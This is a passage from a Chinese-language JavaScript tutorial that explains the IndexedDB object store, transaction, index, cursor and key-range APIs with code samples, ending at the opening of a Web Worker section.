transaction.oncomplete &#x3D; function (event) &#123;</span><br><span class="line">    console.log(&#39;transaction success&#39;);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  transaction.onerror &#x3D; function (event) &#123;</span><br><span class="line">    console.log(&#39;transaction error: &#39; + transaction.error);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  var objectStore &#x3D; transaction.objectStore(&#39;items&#39;);</span><br><span class="line">  var objectStoreRequest &#x3D; objectStore.add(&#123; foo: 1 &#125;);</span><br><span class="line"></span><br><span class="line">  objectStoreRequest.onsuccess &#x3D; function (event) &#123;</span><br><span class="line">    console.log(&#39;add data success&#39;);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>（2）IDBObjectStore.put()</strong></p>
<p><code>IDBObjectStore.put()</code>方法用于更新某个主键对应的数据记录，如果对应的键值不存在，则插入一条新的记录。该方法返回一个 IDBRequest 对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectStore.put(item, key)</span><br></pre></td></tr></table></figure>

<p>该方法接受两个参数，第一个参数为新数据，第二个参数为主键，该参数可选，且只在自动递增时才有必要提供，因为那时主键不包含在数据值里面。</p>
<p><strong>（3）IDBObjectStore.clear()</strong></p>
<p><code>IDBObjectStore.clear()</code>删除当前对象仓库的所有记录。该方法返回一个 IDBRequest 对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectStore.clear()</span><br></pre></td></tr></table></figure>

<p>该方法不需要参数。</p>
<p><strong>（4）IDBObjectStore.delete()</strong></p>
<p><code>IDBObjectStore.delete()</code>方法用于删除指定主键的记录。该方法返回一个 IDBRequest 对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectStore.delete(Key)</span><br></pre></td></tr></table></figure>

<p>该方法的参数为主键的值。</p>
<p><strong>（5）IDBObjectStore.count()</strong></p>
<p><code>IDBObjectStore.count()</code>方法用于计算记录的数量。该方法返回一个 IDBRequest 对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IDBObjectStore.count(key)</span><br></pre></td></tr></table></figure>

<p>不带参数时，该方法返回当前对象仓库的所有记录数量。如果主键或 IDBKeyRange 对象作为参数，则返回对应的记录数量。</p>
<p><strong>（6）IDBObjectStore.getKey()</strong></p>
<p><code>IDBObjectStore.getKey()</code>用于获取主键。该方法返回一个 IDBRequest 对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectStore.getKey(key)</span><br></pre></td></tr></table></figure>

<p>该方法的参数可以是主键值或 IDBKeyRange 对象。</p>
<p><strong>（7）IDBObjectStore.get()</strong></p>
<p><code>IDBObjectStore.get()</code>用于获取主键对应的数据记录。该方法返回一个 IDBRequest 对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectStore.get(key)</span><br></pre></td></tr></table></figure>

<p><strong>（8）IDBObjectStore.getAll()</strong></p>
<p><code>DBObjectStore.getAll()</code>用于获取对象仓库的记录。该方法返回一个 IDBRequest 对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 获取所有记录</span><br><span class="line">objectStore.getAll()</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 获取所有符合指定主键或 IDBKeyRange 的记录</span><br><span class="line">objectStore.getAll(query)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 指定获取记录的数量</span><br><span class="line">objectStore.getAll(query, count)</span><br></pre></td></tr></table></figure>

<p><strong>（9）IDBObjectStore.getAllKeys()</strong></p>
<p><code>IDBObjectStore.getAllKeys()</code>用于获取所有符合条件的主键。该方法返回一个 IDBRequest 对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 获取所有记录的主键</span><br><span class="line">objectStore.getAllKeys()</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 获取所有符合条件的主键</span><br><span class="line">objectStore.getAllKeys(query)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 指定获取主键的数量</span><br><span class="line">objectStore.getAllKeys(query, count)</span><br></pre></td></tr></table></figure>

<p><strong>（10）IDBObjectStore.index()</strong></p>
<p><code>IDBObjectStore.index()</code>方法返回指定名称的索引对象 IDBIndex。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectStore.index(name)</span><br></pre></td></tr></table></figure>

<p>有了索引以后，就可以针对索引所在的属性读取数据。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var t &#x3D; db.transaction([&#39;people&#39;], &#39;readonly&#39;);</span><br><span class="line">var store &#x3D; t.objectStore(&#39;people&#39;);</span><br><span class="line">var index &#x3D; store.index(&#39;name&#39;);</span><br><span class="line"></span><br><span class="line">var request &#x3D; index.get(&#39;foo&#39;);</span><br></pre></td></tr></table></figure>

<p>上面代码打开对象仓库以后，先用<code>index()</code>方法指定获取<code>name</code>属性的索引，然后用<code>get()</code>方法读取某个<code>name</code>属性(<code>foo</code>)对应的数据。如果<code>name</code>属性不是对应唯一值，这时<code>get()</code>方法有可能取回多个数据对象。另外，<code>get()</code>是异步方法，读取成功以后，只能在<code>success</code>事件的监听函数中处理数据。</p>
<p><strong>（11）IDBObjectStore.createIndex()</strong></p>
<p><code>IDBObjectStore.createIndex()</code>方法用于新建当前数据库的一个索引。该方法只能在<code>VersionChange</code>监听函数里面调用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectStore.createIndex(indexName, keyPath, objectParameters)</span><br></pre></td></tr></table></figure>

<p>该方法可以接受三个参数。</p>
<ul>
<li>indexName：索引名</li>
<li>keyPath：主键</li>
<li>objectParameters：配置对象（可选）</li>
</ul>
<p>第三个参数可以配置以下属性。</p>
<ul>
<li>unique：如果设为<code>true</code>，将不允许重复的值</li>
<li>multiEntry：如果设为<code>true</code>，对于有多个值的主键数组，每个值将在索引里面新建一个条目，否则主键数组对应一个条目。</li>
</ul>
<p>假定对象仓库中的数据记录都是如下的<code>person</code>类型。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var person &#x3D; &#123;</span><br><span class="line">  name: name,</span><br><span class="line">  email: email,</span><br><span class="line">  created: new Date()</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>可以指定这个对象的某个属性来建立索引。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var store &#x3D; db.createObjectStore(&#39;people&#39;, &#123; autoIncrement: true &#125;);</span><br><span class="line"></span><br><span class="line">store.createIndex(&#39;name&#39;, &#39;name&#39;, &#123; unique: false &#125;);</span><br><span class="line">store.createIndex(&#39;email&#39;, &#39;email&#39;, &#123; unique: true &#125;);</span><br></pre></td></tr></table></figure>

<p>上面代码告诉索引对象，<code>name</code>属性不是唯一值，<code>email</code>属性是唯一值。</p>
<p><strong>（12）IDBObjectStore.deleteIndex()</strong></p>
<p><code>IDBObjectStore.deleteIndex()</code>方法用于删除指定的索引。该方法只能在<code>VersionChange</code>监听函数里面调用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectStore.deleteIndex(indexName)</span><br></pre></td></tr></table></figure>

<p><strong>（13）IDBObjectStore.openCursor()</strong></p>
<p><code>IDBObjectStore.openCursor()</code>用于获取一个指针对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IDBObjectStore.openCursor()</span><br></pre></td></tr></table></figure>

<p>指针对象可以用来遍历数据。该对象也是异步的，有自己的<code>success</code>和<code>error</code>事件，可以对它们指定监听函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var t &#x3D; db.transaction([&#39;test&#39;], &#39;readonly&#39;);</span><br><span class="line">var store &#x3D; t.objectStore(&#39;test&#39;);</span><br><span class="line"></span><br><span class="line">var cursor &#x3D; store.openCursor();</span><br><span class="line"></span><br><span class="line">cursor.onsuccess &#x3D; function (event) &#123;</span><br><span class="line">  var res &#x3D; event.target.result;</span><br><span class="line">  if (res) &#123;</span><br><span class="line">    console.log(&#39;Key&#39;, res.key);</span><br><span class="line">    console.dir(&#39;Data&#39;, res.value);</span><br><span class="line">    res.continue();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>监听函数接受一个事件对象作为参数，该对象的<code>target.result</code>属性指向当前数据记录。该记录的<code>key</code>和<code>value</code>分别返回主键和键值（即实际存入的数据）。<code>continue()</code>方法将光标移到下一个数据对象，如果当前数据对象已经是最后一个数据了，则光标指向<code>null</code>。</p>
<p><code>openCursor()</code>方法的第一个参数是主键值，或者一个 IDBKeyRange 对象。如果指定该参数，将只处理包含指定主键的记录；如果省略，将处理所有的记录。该方法还可以接受第二个参数，表示遍历方向，默认值为<code>next</code>，其他可能的值为<code>prev</code>、<code>nextunique</code>和<code>prevunique</code>。后两个值表示如果遇到重复值，会自动跳过。</p>
<p><strong>（14）IDBObjectStore.openKeyCursor()</strong></p>
<p><code>IDBObjectStore.openKeyCursor()</code>用于获取一个主键指针对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IDBObjectStore.openKeyCursor()</span><br></pre></td></tr></table></figure>

<h3 id="IDBTransaction-对象"><a href="#IDBTransaction-对象" class="headerlink" title="IDBTransaction 对象"></a>IDBTransaction 对象</h3><p>IDBTransaction 对象用来异步操作数据库事务，所有的读写操作都要通过这个对象进行。</p>
<p><code>IDBDatabase.transaction()</code>方法返回的就是一个 IDBTransaction 对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">var db;</span><br><span class="line">var DBOpenRequest &#x3D; window.indexedDB.open(&#39;demo&#39;, 1);</span><br><span class="line"></span><br><span class="line">DBOpenRequest.onsuccess &#x3D; function(event) &#123;</span><br><span class="line">  db &#x3D; DBOpenRequest.result;</span><br><span class="line">  var transaction &#x3D; db.transaction([&#39;demo&#39;], &#39;readwrite&#39;);</span><br><span class="line"></span><br><span class="line">  transaction.oncomplete &#x3D; function (event) &#123;</span><br><span class="line">    console.log(&#39;transaction success&#39;);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  transaction.onerror &#x3D; function (event) &#123;</span><br><span class="line">    console.log(&#39;transaction error: &#39; + transaction.error);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  var objectStore &#x3D; transaction.objectStore(&#39;demo&#39;);</span><br><span class="line">  var objectStoreRequest &#x3D; objectStore.add(&#123; foo: 1 &#125;);</span><br><span class="line"></span><br><span class="line">  objectStoreRequest.onsuccess &#x3D; function (event) &#123;</span><br><span class="line">    console.log(&#39;add data success&#39;);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>事务的执行顺序是按照创建的顺序，而不是发出请求的顺序。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var trans1 &#x3D; db.transaction(&#39;foo&#39;, &#39;readwrite&#39;);</span><br><span class="line">var trans2 &#x3D; db.transaction(&#39;foo&#39;, &#39;readwrite&#39;);</span><br><span class="line">var objectStore2 &#x3D; trans2.objectStore(&#39;foo&#39;)</span><br><span class="line">var objectStore1 &#x3D; trans1.objectStore(&#39;foo&#39;)</span><br><span class="line">objectStore2.put(&#39;2&#39;, &#39;key&#39;);</span><br><span class="line">objectStore1.put(&#39;1&#39;, &#39;key&#39;);</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>key</code>对应的键值最终是<code>2</code>，而不是<code>1</code>。因为事务<code>trans1</code>先于<code>trans2</code>创建，所以首先执行。</p>
<p>注意，事务有可能失败，只有监听到事务的<code>complete</code>事件，才能保证事务操作成功。</p>
<p>IDBTransaction 对象有以下属性。</p>
<ul>
<li><code>IDBTransaction.db</code>：返回当前事务所在的数据库对象 IDBDatabase。</li>
<li><code>IDBTransaction.error</code>：返回当前事务的错误。如果事务没有结束，或者事务成功结束，或者被手动终止，该方法返回<code>null</code>。</li>
<li><code>IDBTransaction.mode</code>：返回当前事务的模式，默认是<code>readonly</code>（只读），另一个值是<code>readwrite</code>。</li>
<li><code>IDBTransaction.objectStoreNames</code>：返回一个类似数组的对象 DOMStringList，成员是当前事务涉及的对象仓库的名字。</li>
<li><code>IDBTransaction.onabort</code>：指定<code>abort</code>事件（事务中断）的监听函数。</li>
<li><code>IDBTransaction.oncomplete</code>：指定<code>complete</code>事件（事务成功）的监听函数。</li>
<li><code>IDBTransaction.onerror</code>：指定<code>error</code>事件（事务失败）的监听函数。</li>
</ul>
<p>IDBTransaction 对象有以下方法。</p>
<ul>
<li><code>IDBTransaction.abort()</code>：终止当前事务，回滚所有已经进行的变更。</li>
<li><code>IDBTransaction.objectStore(name)</code>：返回指定名称的对象仓库 IDBObjectStore。</li>
</ul>
<h3 id="IDBIndex-对象"><a href="#IDBIndex-对象" class="headerlink" title="IDBIndex 对象"></a>IDBIndex 对象</h3><p>IDBIndex 对象代表数据库的索引，通过这个对象可以获取数据库里面的记录。数据记录的主键默认就是带有索引，IDBIndex 对象主要用于通过除主键以外的其他键，建立索引获取对象。</p>
<p>IDBIndex 是持久性的键值对存储。只要插入、更新或删除数据记录，引用的对象库中的记录，索引就会自动更新。</p>
<p><code>IDBObjectStore.index()</code>方法可以获取 IDBIndex 对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">var transaction &#x3D; db.transaction([&#39;contactsList&#39;], &#39;readonly&#39;);</span><br><span class="line">var objectStore &#x3D; transaction.objectStore(&#39;contactsList&#39;);</span><br><span class="line">var myIndex &#x3D; objectStore.index(&#39;lName&#39;);</span><br><span class="line"></span><br><span class="line">myIndex.openCursor().onsuccess &#x3D; function (event) &#123;</span><br><span class="line">  var cursor &#x3D; event.target.result;</span><br><span class="line">  if (cursor) &#123;</span><br><span class="line">    var tableRow &#x3D; document.createElement(&#39;tr&#39;);</span><br><span class="line">    tableRow.innerHTML &#x3D;   &#39;&lt;td&gt;&#39; + cursor.value.id + &#39;&lt;&#x2F;td&gt;&#39;</span><br><span class="line">                         + &#39;&lt;td&gt;&#39; + cursor.value.lName + &#39;&lt;&#x2F;td&gt;&#39;</span><br><span class="line">                         + &#39;&lt;td&gt;&#39; + cursor.value.fName + &#39;&lt;&#x2F;td&gt;&#39;</span><br><span class="line">                         + &#39;&lt;td&gt;&#39; + cursor.value.jTitle + &#39;&lt;&#x2F;td&gt;&#39;</span><br><span class="line">                         + &#39;&lt;td&gt;&#39; + cursor.value.company + &#39;&lt;&#x2F;td&gt;&#39;</span><br><span class="line">                         + &#39;&lt;td&gt;&#39; + cursor.value.eMail + &#39;&lt;&#x2F;td&gt;&#39;</span><br><span class="line">                         + &#39;&lt;td&gt;&#39; + cursor.value.phone + &#39;&lt;&#x2F;td&gt;&#39;</span><br><span class="line">                         + &#39;&lt;td&gt;&#39; + cursor.value.age + &#39;&lt;&#x2F;td&gt;&#39;;</span><br><span class="line">    tableEntry.appendChild(tableRow);</span><br><span class="line"></span><br><span class="line">    cursor.continue();</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    console.log(&#39;Entries all displayed.&#39;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>IDBIndex 对象有以下属性。</p>
<ul>
<li><code>IDBIndex.name</code>：字符串，索引的名称。</li>
<li><code>IDBIndex.objectStore</code>：索引所在的对象仓库。</li>
<li><code>IDBIndex.keyPath</code>：索引的主键。</li>
<li><code>IDBIndex.multiEntry</code>：布尔值，针对<code>keyPath</code>为数组的情况，如果设为<code>true</code>，创建数组时，每个数组成员都会有一个条目，否则每个数组都只有一个条目。</li>
<li><code>IDBIndex.unique</code>：布尔值，表示创建索引时是否允许相同的主键。</li>
</ul>
<p>IDBIndex 对象有以下方法，它们都是异步的，立即返回的都是一个 IDBRequest 对象。</p>
<ul>
<li><code>IDBIndex.count()</code>：用来获取记录的数量。它可以接受主键或 IDBKeyRange 对象作为参数，这时只返回符合主键的记录数量，否则返回所有记录的数量。</li>
<li><code>IDBIndex.get(key)</code>：用来获取符合指定主键的数据记录。</li>
<li><code>IDBIndex.getKey(key)</code>：用来获取指定的主键。</li>
<li><code>IDBIndex.getAll()</code>：用来获取所有的数据记录。它可以接受两个参数，都是可选的，第一个参数用来指定主键，第二个参数用来指定返回记录的数量。如果省略这两个参数，则返回所有记录。由于获取成功时，浏览器必须生成所有对象，所以对性能有影响。如果数据集比较大，建议使用 IDBCursor 对象。</li>
<li><code>IDBIndex.getAllKeys()</code>：该方法与<code>IDBIndex.getAll()</code>方法相似，区别是获取所有主键。</li>
<li><code>IDBIndex.openCursor()</code>：用来获取一个 IDBCursor 对象，用来遍历索引里面的所有条目。</li>
<li><code>IDBIndex.openKeyCursor()</code>：该方法与<code>IDBIndex.openCursor()</code>方法相似，区别是遍历所有条目的主键。</li>
</ul>
<h3 id="IDBCursor-对象"><a href="#IDBCursor-对象" class="headerlink" title="IDBCursor 对象"></a>IDBCursor 对象</h3><p>IDBCursor 对象代表指针对象，用来遍历数据仓库（IDBObjectStore）或索引（IDBIndex）的记录。</p>
<p>IDBCursor 对象一般通过<code>IDBObjectStore.openCursor()</code>方法获得。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">var transaction &#x3D; db.transaction([&#39;rushAlbumList&#39;], &#39;readonly&#39;);</span><br><span class="line">var objectStore &#x3D; transaction.objectStore(&#39;rushAlbumList&#39;);</span><br><span class="line"></span><br><span class="line">objectStore.openCursor(null, &#39;next&#39;).onsuccess &#x3D; function(event) &#123;</span><br><span class="line">  var cursor &#x3D; event.target.result;</span><br><span class="line">  if (cursor) &#123;</span><br><span class="line">    var listItem &#x3D; document.createElement(&#39;li&#39;);</span><br><span class="line">    listItem.innerHTML &#x3D; cursor.value.albumTitle + &#39;, &#39; + cursor.value.year;</span><br><span class="line">    list.appendChild(listItem);</span><br><span class="line"></span><br><span class="line">    console.log(cursor.source);</span><br><span class="line">    cursor.continue();</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    console.log(&#39;Entries all displayed.&#39;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>IDBCursor 对象的属性。</p>
<ul>
<li><code>IDBCursor.source</code>：返回正在遍历的对象仓库或索引。</li>
<li><code>IDBCursor.direction</code>：字符串，表示指针遍历的方向。共有四个可能的值：next（从头开始向后遍历）、nextunique（从头开始向后遍历，重复的值只遍历一次）、prev（从尾部开始向前遍历）、prevunique（从尾部开始向前遍历，重复的值只遍历一次）。该属性通过<code>IDBObjectStore.openCursor()</code>方法的第二个参数指定，一旦指定就不能改变了。</li>
<li><code>IDBCursor.key</code>：返回当前记录的主键。</li>
<li><code>IDBCursor.value</code>：返回当前记录的数据值。</li>
<li><code>IDBCursor.primaryKey</code>：返回当前记录的主键。对于数据仓库（objectStore）来说，这个属性等同于 IDBCursor.key；对于索引，IDBCursor.key 返回索引的位置值，该属性返回数据记录的主键。</li>
</ul>
<p>IDBCursor 对象有如下方法。</p>
<ul>
<li><code>IDBCursor.advance(n)</code>：指针向前移动 n 个位置。</li>
<li><code>IDBCursor.continue()</code>：指针向前移动一个位置。它可以接受一个主键作为参数，这时会跳转到这个主键。</li>
<li><code>IDBCursor.continuePrimaryKey()</code>：该方法需要两个参数，第一个是<code>key</code>，第二个是<code>primaryKey</code>，将指针移到符合这两个参数的位置。</li>
<li><code>IDBCursor.delete()</code>：用来删除当前位置的记录，返回一个 IDBRequest 对象。该方法不会改变指针的位置。</li>
<li><code>IDBCursor.update()</code>：用来更新当前位置的记录，返回一个 IDBRequest 对象。它的参数是要写入数据库的新的值。</li>
</ul>
<h3 id="IDBKeyRange-对象"><a href="#IDBKeyRange-对象" class="headerlink" title="IDBKeyRange 对象"></a>IDBKeyRange 对象</h3><p>IDBKeyRange 对象代表数据仓库（object store）里面的一组主键。根据这组主键，可以获取数据仓库或索引里面的一组记录。</p>
<p>IDBKeyRange 可以只包含一个值，也可以指定上限和下限。它有四个静态方法，用来指定主键的范围。</p>
<ul>
<li><code>IDBKeyRange.lowerBound()</code>：指定下限。</li>
<li><code>IDBKeyRange.upperBound()</code>：指定上限。</li>
<li><code>IDBKeyRange.bound()</code>：同时指定上下限。</li>
<li><code>IDBKeyRange.only()</code>：指定只包含一个值。</li>
</ul>
<p>下面是一些代码实例。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; All keys ≤ x</span><br><span class="line">var r1 &#x3D; IDBKeyRange.upperBound(x);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; All keys &lt; x</span><br><span class="line">var r2 &#x3D; IDBKeyRange.upperBound(x, true);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; All keys ≥ y</span><br><span class="line">var r3 &#x3D; IDBKeyRange.lowerBound(y);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; All keys &gt; y</span><br><span class="line">var r4 &#x3D; IDBKeyRange.lowerBound(y, true);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; All keys ≥ x &amp;&amp; ≤ y</span><br><span class="line">var r5 &#x3D; IDBKeyRange.bound(x, y);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; All keys &gt; x &amp;&amp;&lt; y</span><br><span class="line">var r6 &#x3D; IDBKeyRange.bound(x, y, true, true);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; All keys &gt; x &amp;&amp; ≤ y</span><br><span class="line">var r7 &#x3D; IDBKeyRange.bound(x, y, true, false);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; All keys ≥ x &amp;&amp;&lt; y</span><br><span class="line">var r8 &#x3D; IDBKeyRange.bound(x, y, false, true);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; The key &#x3D; z</span><br><span class="line">var r9 &#x3D; IDBKeyRange.only(z);</span><br></pre></td></tr></table></figure>

<p><code>IDBKeyRange.lowerBound()</code>、<code>IDBKeyRange.upperBound()</code>、<code>IDBKeyRange.bound()</code>这三个方法默认包括端点值，可以传入一个布尔值，修改这个属性。</p>
<p>与之对应，IDBKeyRange 对象有四个只读属性。</p>
<ul>
<li><code>IDBKeyRange.lower</code>：返回下限</li>
<li><code>IDBKeyRange.lowerOpen</code>：布尔值，表示下限是否为开区间（即下限是否排除在范围之外）</li>
<li><code>IDBKeyRange.upper</code>：返回上限</li>
<li><code>IDBKeyRange.upperOpen</code>：布尔值，表示上限是否为开区间（即上限是否排除在范围之外）</li>
</ul>
<p>IDBKeyRange 实例对象生成以后，将它作为参数输入 IDBObjectStore 或 IDBIndex 对象的<code>openCursor()</code>方法，就可以在所设定的范围内读取数据。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var t &#x3D; db.transaction([&#39;people&#39;], &#39;readonly&#39;);</span><br><span class="line">var store &#x3D; t.objectStore(&#39;people&#39;);</span><br><span class="line">var index &#x3D; store.index(&#39;name&#39;);</span><br><span class="line"></span><br><span class="line">var range &#x3D; IDBKeyRange.bound(&#39;B&#39;, &#39;D&#39;);</span><br><span class="line"></span><br><span class="line">index.openCursor(range).onsuccess &#x3D; function (e) &#123;</span><br><span class="line">  var cursor &#x3D; e.target.result;</span><br><span class="line">  if (cursor) &#123;</span><br><span class="line">    console.log(cursor.key + &#39;:&#39;);</span><br><span class="line"></span><br><span class="line">    for (var field in cursor.value) &#123;</span><br><span class="line">      console.log(cursor.value[field]);</span><br><span class="line">    &#125;</span><br><span class="line">    cursor.continue();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>IDBKeyRange 有一个实例方法<code>includes(key)</code>，返回一个布尔值，表示某个主键是否包含在当前这个主键组之内。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var keyRangeValue &#x3D; IDBKeyRange.bound(&#39;A&#39;, &#39;K&#39;, false, false);</span><br><span class="line"></span><br><span class="line">keyRangeValue.includes(&#39;F&#39;) &#x2F;&#x2F; true</span><br><span class="line">keyRangeValue.includes(&#39;W&#39;) &#x2F;&#x2F; false</span><br></pre></td></tr></table></figure>

<h2 id="Web-Worker"><a href="#Web-Worker" class="headerlink" title="Web Worker"></a>Web Worker</h2><h3 id="概述-8"><a href="#概述-8" class="headerlink" title="概述"></a>概述</h3><p>JavaScript 语言采用的是单线程模型，也就是说，所有任务只能在一个线程上完成，一次只能做一件事。前面的任务没做完，后面的任务只能等着。随着电脑计算能力的增强，尤其是多核 CPU 的出现，单线程带来很大的不便，无法充分发挥计算机的计算能力。</p>
<p>Web Worker 的作用，就是为 JavaScript 创造多线程环境，允许主线程创建 Worker 线程，将一些任务分配给后者运行。在主线程运行的同时，Worker 线程在后台运行，两者互不干扰。等到 Worker 线程完成计算任务，再把结果返回给主线程。这样的好处是，一些计算密集型或高延迟的任务可以交由 Worker 线程执行，主线程（通常负责 UI 交互）能够保持流畅，不会被阻塞或拖慢。</p>
<p>Worker 线程一旦新建成功，就会始终运行，不会被主线程上的活动（比如用户点击按钮、提交表单）打断。这样有利于随时响应主线程的通信。但是，这也造成了 Worker 比较耗费资源，不应该过度使用，而且一旦使用完毕，就应该关闭。</p>
<p>Web Worker 有以下几个使用注意点。</p>
